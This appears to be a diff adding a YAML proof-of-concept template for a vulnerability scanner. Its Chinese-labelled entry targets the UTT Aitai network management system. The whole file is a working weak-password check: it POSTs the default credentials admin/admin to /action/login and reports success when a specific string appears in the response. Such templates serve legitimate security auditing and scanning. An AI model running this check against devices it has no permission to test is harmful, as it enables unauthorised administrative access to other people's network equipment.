@@ -1,0 +1,18 @@
+id: poc-yaml-utt-aitai-net-weak-pass
+info:
+  name: UTT艾泰网络管理系统弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: UTT艾泰网络管理系统
+requests:
+- method: POST
+  path: /action/login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=admin&password=admin
+  expression: 'status_code == 200 && contains(body, "var time=0;var leftPwdNums=0")
+
+    '
+variables: {}
+transport: http
